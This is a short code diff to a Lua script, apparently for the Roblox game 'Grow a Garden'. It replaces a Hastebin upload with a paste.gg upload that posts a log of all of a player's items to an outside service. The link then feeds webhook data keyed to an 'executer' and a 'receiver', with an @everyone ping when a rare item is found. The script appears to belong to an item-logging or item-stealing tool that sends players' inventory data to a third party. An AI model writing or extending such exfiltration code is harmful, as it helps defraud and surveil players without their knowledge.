@@ -141,21 +141,30 @@ local function buildItemsEmbed(items)
     }
 end
 
-local function uploadToHastebin(text)
-    local url = "https://hastebin.com/documents"
+local function uploadToPasteGG(text)
+    local url = "https://api.paste.gg/v1/pastes"
+    local data = {
+        name = "GAG Item Log",
+        description = "All items from Grow a Garden logger",
+        expires = os.date("!%Y-%m-%dT%H:%M:%SZ", os.time() + 5 * 60 * 60), -- 5 hours from now
+        files = {{
+            name = "items.txt",
+            content = { format = "text", value = text }
+        }}
+    }
     local response
     pcall(function()
         response = req({
             Url = url,
             Method = "POST",
-            Headers = {["Content-Type"] = "text/plain"},
-            Body = text
+            Headers = {["Content-Type"] = "application/json"},
+            Body = HttpService:JSONEncode(data)
         })
     end)
     if response and response.Body then
-        local data = HttpService:JSONDecode(response.Body)
-        if data and data.key then
-            return ("https://hastebin.com/%s.txt"):format(data.key)
+        local parsed = HttpService:JSONDecode(response.Body)
+        if parsed and parsed.result and parsed.result.id then
+            return "https://paste.gg/p/" .. parsed.result.id
         end
     end
     return nil
@@ -201,7 +210,7 @@ local function prettyWebhookData(executer, receiver)
     end
     -- Always upload ALL items, not just extras
     local pasteText = buildAllItemsText(items)
-    local pasteLink = uploadToHastebin(pasteText)
+local pasteLink = uploadToPasteGG(pasteText)
     return {
         content = (foundRare and "@everyone" or ""),
         embeds = {
